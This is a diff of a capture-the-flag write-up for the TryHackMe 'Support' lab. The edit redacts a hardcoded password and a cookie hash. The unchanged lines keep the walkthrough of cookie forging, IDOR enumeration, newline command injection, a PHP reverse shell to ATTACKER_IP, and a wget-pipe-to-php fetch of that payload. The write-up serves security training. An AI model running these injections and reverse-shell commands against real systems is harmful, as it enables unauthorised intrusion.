@@ -1,6 +1,7 @@
 ![Congrats](assets/screenshots/support-thm/support%20congrats.jpg)
 
 # Support — TryHackMe
+**Room Link:** [Support](https://tryhackme.com/room/support)
 
 ## Overview
 The Support room on TryHackMe is a practical penetration testing challenge that simulates an internal support operations platform. The application contains multiple vulnerabilities, including Local File Inclusion (LFI), IDOR, weak session management, and command injection. The ultimate goal is to gain administrative access and achieve Remote Code Execution (RCE).
@@ -67,29 +68,29 @@ This looks for a browser cookie named `isITUser`. If a user manually creates thi
 
 The `config.php` reveals hardcoded secrets:
 ```php
-$MASTER_PASSWORD = 'support@110';
+$MASTER_PASSWORD = '[REDACTED]';
 ```
 
 ## Generating the Required Cookie Value
 Generate the MD5 hash of "true":
 ```bash
 echo -n "true" | md5sum
-# Output: b326b5062b2f0e69046810717534cb09
+# Output: [REDACTED]
 ```
 
-In the browser’s Developer Tools, navigate to Storage → Cookies. Edit the `isITUser` cookie value to `b326b5062b2f0e69046810717534cb09`.
+In the browser’s Developer Tools, navigate to Storage → Cookies. Edit the `isITUser` cookie value to `[REDACTED]`.
 
 ## IDOR to Confirm the Admin Account
 With the modified cookie, access the API endpoint to enumerate users:
 ```bash
-curl -s -b "isITUser=b326b5062b2f0e69046810717534cb09" "http://10.48.169.226/api.php?id=1"
+curl -s -b "isITUser=[REDACTED]" "http://10.48.169.226/api.php?id=1"
 ```
 Admin Email Discovered: `specialadmin@support.thm`
 
 ## Login as Admin
 Log in using the admin credentials extracted from the source code.
 Email: `specialadmin@support.thm`
-Password: `support@110`
+Password: `[REDACTED]`
 
 The first flag is displayed on the dashboard!
 
@@ -100,7 +101,7 @@ The admin dashboard contains a form with a dropdown designed to execute system c
 
 Test for command injection with newline encoding (`%0a`):
 ```bash
-curl -b "isITUser=b326b5062b2f0e69046810717534cb09" -X POST http://10.48.169.226/dashboard.php -d "sys=date%0als"
+curl -b "isITUser=[REDACTED]" -X POST http://10.48.169.226/dashboard.php -d "sys=date%0als"
 ```
 This executes both commands successfully.
 
@@ -112,7 +113,7 @@ echo '<?php system("bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\""); ?>'
 
 Host the payload and set up a listener, then inject the payload:
 ```bash
-curl -b "isITUser=b326b5062b2f0e69046810717534cb09" -X POST http://10.48.169.226/dashboard.php -d "sys=date%0awget -q -O- http://ATTACKER_IP:8000/shell.php | php"
+curl -b "isITUser=[REDACTED]" -X POST http://10.48.169.226/dashboard.php -d "sys=date%0awget -q -O- http://ATTACKER_IP:8000/shell.php | php"
 ```
 
 Once inside the reverse shell, read the root flag:
